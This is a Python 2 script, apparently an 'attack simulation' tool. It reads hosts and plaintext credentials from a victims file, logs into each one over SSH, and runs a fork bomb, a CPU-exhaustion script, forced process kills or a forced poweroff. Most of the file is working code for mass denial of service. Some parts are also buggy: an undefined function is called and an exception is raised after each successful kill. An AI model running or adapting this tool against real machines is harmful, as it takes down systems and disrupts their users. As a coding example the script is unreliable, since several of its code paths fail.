import sys
from pexpect import pxssh
import csv
import os
from time import sleep
from collections import defaultdict


menu = {}
menu ['1'] = "Machine Resource Overload <requires scripts>"
menu ['2'] = "Process Kill"
menu ['3'] = "Machine Poweroff"
menu ['4'] = "Machine Reboot <inactive>"
menu ['5'] = "Fork Bomb"
menu ['6'] = "Exit Menu"

i = 1
while True:
        options=menu.keys()
        options = sorted(options)
        #for entry in options:
        #        print (entry,menu[entry])

        #selection=input("Select which attack you wish to simulate\n")
        #attack now specified as command line argument
        selection = sys.argv[i]
	i = i + 1
#       print("Reading in Victims")
#       with open('victims.txt', 'rt') as csvfile:
#               victims = csv.reader(csvfile)
#               for row in victims:
#                       print("Host:%s \tUser:%s  \tPassword:%s\n" %(row[0],row[1],row[2]))
#
#       victims=''
        if selection == '1':

                print("Reading in Victims")
                with open('victims.txt', 'r') as csvfile:
                        victims = csv.reader(csvfile)
                        for row in victims:
                                print("Host:%s \tUser:%s  \tPassword:%s\n" %(row[0],row[1],row[2]))

                                s = pxssh.pxssh()
                                if not s.login(row[0],row[1],row[2]):
                                        print ("SSH SESSION FAILURE")
                                        print (str(s))
                                else:
                                        print("SSH SESSION LOGIN SUCCESS")

                                        s.sendline('python cpufork.py &')
                                        s.prompt()
                                        print("Fork Bomb Active")
                                        s.logout




        elif selection == '2':
                print ("Running Process Kill.\n\n")

                process=raw_input("Which process to kill: ")
                comand="sudo pkill -9 "
                command=comand+process
                print(command)

                with open('victims.txt', 'r') as csvfile:
                        victims = csv.reader(csvfile)
                        for row in victims:
                                print("Host:%s \tUser:%s  \tPassword:%s\n"%(row[0],row[1],row[2]))
                                s=pxssh.pxssh()
                                try:
                                        if not s.login(row[0],row[1],row[2]):
                                                print("SSH SESSION FAILURE")
                                                print(sts(s))
                                        else:
                                                print("SSH SUCCESS")
                                                s.prompt()
                                                s.sendline(command)
                                                s.prompt()
						print(s.before)
						s.logout()
                                                print("Machine %s Complete" %(row[0]))
                                        raise Exception('ERROR: Something went very wrong, check to see if machine is online')
                                except Exception as error:
                                        print error.args
                                        raise



        elif selection == '3':
                print ("Poweroff Machine.....\n\n")
                with open('victims.txt', 'r') as csvfile:
                        victims = csv.reader(csvfile)
                        for row in victims:
                                print("Host:%s \tUser:%s  \tPassword:%s\n"%(row[0],row[1],row[2]))
                                s=pxssh.pxssh()
                                if not s.login(row[0],row[1],row[2]):
                                        print("SSH SESSION FAILURE")
                                        print(sts(s))
                                else:
                                        print("SSH SUCCESS")
                                        s.sendline('sudo poweroff')
                                        s.prompt()
                                        print(s.before)
                                        s.sendline(row[2])
                                        s.prompt()
                                        print(s.before)
                                        s.logout()
                                        print("Machine %s Complete" %(row[0]))

        elif selection == '4':
                print ("Running Reboot.....\n\n")
        elif selection == '5':
                print ("Running Fork Bomb.....\n\n")
                with open('victims.txt', 'r') as csvfile:
                        victims=csv.reader(csvfile)
                        for row in victims:
                                print("Host:%s\tUser:%s\tPassword:%s\n"%(row[0],row[1],row[2]))
                                s=pxssh.pxssh()
                                if not s.login(row[0],row[1],row[2]):
                                        print("SSH SESSION FAILURE")
                                        print(sts(s))
                                else:
                                        print("SSH SUCCESS")
                                        s.sendline(':(){ :|: & };:')
                                        s.prompt()
                                        s.logout()
                                        print("Machine %s Complete" %(row[0]))
        elif selection == '6':
                print ("Exiting.....\n\n")
                break
        else:
                print ("Unknown option, try again\n\n")
